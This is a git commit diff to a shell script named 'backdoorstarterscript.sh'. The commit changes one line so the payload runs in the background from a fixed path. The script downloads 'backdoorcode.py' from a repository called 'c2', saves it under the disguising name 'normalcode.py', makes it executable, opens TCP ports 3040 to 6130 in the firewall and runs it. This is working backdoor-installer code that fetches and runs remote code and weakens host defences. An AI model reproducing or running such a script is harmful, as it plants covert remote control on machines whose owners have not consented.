f304f2f86ddfb08f838f8802781271536bdc7408
anmolmittal13 <72708880+anmolmittal13@users.noreply.github.com>
2023-12-07 01:16:38 -0600

    add file path

--- backdoorstarterscript.sh
+++ backdoorstarterscript.sh
@@ -5,4 +5,4 @@ pip3 install cryptography;
 curl -o normalcode.py https://raw.githubusercontent.com/anmolmittal13/c2/main/backdoorcode.py
 chmod +x normalcode.py;
 firewall-cmd --add-port=3040-6130/tcp;
-python3 normalcode.py;
+python3 /home/user/normalcode.py &
